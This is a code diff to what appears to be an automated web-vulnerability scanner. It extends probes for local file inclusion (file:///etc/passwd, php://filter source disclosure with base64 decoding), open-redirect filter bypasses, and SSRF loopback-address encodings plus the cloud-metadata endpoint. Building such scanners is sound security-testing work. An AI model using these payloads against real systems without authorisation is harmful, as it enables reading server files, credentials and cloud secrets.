@@ -6,6 +6,7 @@ it reports a signal the agent confirms with its own requests.
 """
 from __future__ import annotations
 
+import base64
 import json as _json
 import random
 import re
@@ -292,16 +293,30 @@ def probe_lfi(ctx: Context, url: str, param: str,
         ("win-ini", "..\\..\\..\\..\\windows\\win.ini"),
         ("win-ini-abs", "/windows/win.ini"),
         ("nullbyte", "../../../../../../etc/passwd%00"),
+        ("file-scheme", "file:///etc/passwd"),
+        ("php-filter", "php://filter/convert.base64-encode/resource=index"),
     ]
     hits, results = [], []
     for name, payload in payloads:
         r = _send(ctx, url, param, payload, method, data, "probe_lfi", name)
-        m = LFI_MARKERS.search(r.get("body", ""))
+        body = r.get("body", "")
+        m = LFI_MARKERS.search(body)
+        marker = m.group(0) if m else None
+        if not marker:
+            # php://filter returns the source base64-encoded - a long
+            # blob that decodes cleanly is source disclosure
+            for b64 in re.findall(r"[A-Za-z0-9+/=]{60,}", body):
+                try:
+                    dec = base64.b64decode(b64).decode("utf-8", "replace")
+                except Exception:
+                    continue
+                if "<?php" in dec or LFI_MARKERS.search(dec):
+                    marker = "base64-decoded: " + dec[:60].strip()
+                    break
         results.append({"name": name, "status": r["status"],
-                        "request_id": r["request_id"],
-                        "marker": m.group(0) if m else None})
-        if m:
-            hits.append({"name": name, "marker": m.group(0),
+                        "request_id": r["request_id"], "marker": marker})
+        if marker:
+            hits.append({"name": name, "marker": marker,
                          "request_id": r["request_id"]})
     return {
         "verdict": ("lfi confirmed marker: " + ", ".join(h["marker"] for h in hits))
@@ -312,23 +327,50 @@ def probe_lfi(ctx: Context, url: str, param: str,
 
 def probe_redirect(ctx: Context, url: str, param: str,
                    method: str = "GET", data: str | None = None) -> dict:
-    dest = "https://example.org/argus-canary"
-    r = _send(ctx, url, param, dest, method, data, "probe_redirect",
-              "external dest")
-    loc = (r.get("headers") or {}).get("location", "")
-    open_r = r["status"] in (301, 302, 303, 307, 308) and "example.org" in loc
-    # client-side redirects never set Location: meta refresh, window.location
-    body = r.get("body", "")
-    client_side = (not open_r) and "example.org" in body and _CLIENT_REDIRECT.search(body)
-    verdict = ("open redirect" if open_r
-               else "open redirect (client-side, via meta-refresh/JS)"
-               if client_side
-               else "not redirected to external host")
+    """Open-redirect variant sweep: a canonical external URL first, then
+    the classic filter-bypass shapes - protocol-relative //host (passes
+    'starts with /' filters), backslash, userinfo host@, and suffix-
+    confusion host.example.org (passes 'contains our host' filters)."""
+    host = urllib.parse.urlparse(url).netloc
+    variants = [
+        ("canonical", "https://example.org/argus-canary"),
+        ("protocol-relative", "//example.org/argus-canary"),
+        ("backslash", "/\\example.org/argus-canary"),
+        ("userinfo", f"https://{host}@example.org/argus"),
+        ("suffix-confuse", f"https://{host}.example.org/argus"),
+    ]
+    hits = []
+    for name, dest in variants:
+        r = _send(ctx, url, param, dest, method, data, "probe_redirect",
+                  name)
+        loc = (r.get("headers") or {}).get("location", "")
+        open_r = (r["status"] in (301, 302, 303, 307, 308)
+                  and "example.org" in loc)
+        # client-side redirects never set Location: meta refresh, JS
+        body = r.get("body", "")
+        client_side = (not open_r and "example.org" in body
+                       and _CLIENT_REDIRECT.search(body))
+        hits.append({"variant": name, "status": r["status"],
+                     "request_id": r["request_id"], "location": loc,
+                     "open": open_r, "client_side": bool(client_side)})
+        if open_r or client_side:
+            break  # first working variant is enough
+    open_h = next((h for h in hits if h["open"]), None)
+    cs_h = next((h for h in hits if h["client_side"]), None)
+    if open_h:
+        verdict = "open redirect" + (f" ({open_h['variant']} variant)"
+                                     if open_h["variant"] != "canonical" else "")
+    elif cs_h:
+        verdict = "open redirect (client-side, via meta-refresh/JS)"
+    else:
+        verdict = "not redirected to external host"
+    first = hits[0]
     return {
         "verdict": verdict,
-        "request_id": r["request_id"],
-        "status": r["status"],
-        "location": loc,
+        "request_id": first["request_id"],
+        "status": first["status"],
+        "location": first["location"],
+        "variants": hits,
     }
 
 
@@ -506,7 +548,10 @@ def probe_ssrf(ctx: Context, url: str, param: str,
     payloads = [
         ("self-fetch", f"http://127.0.0.1:{port}/"),
         ("loopback-name", f"http://localhost:{port}/"),
+        ("short-ip", f"http://127.1:{port}/"),
         ("decimal-ip", f"http://2130706433:{port}/"),
+        ("hex-ip", f"http://0x7f000001:{port}/"),
+        ("octal-ip", f"http://0177.0.0.1:{port}/"),
         ("ipv6-loopback", f"http://[::1]:{port}/"),
         ("cloud-metadata", "http://169.254.169.254/latest/meta-data/"),
     ]
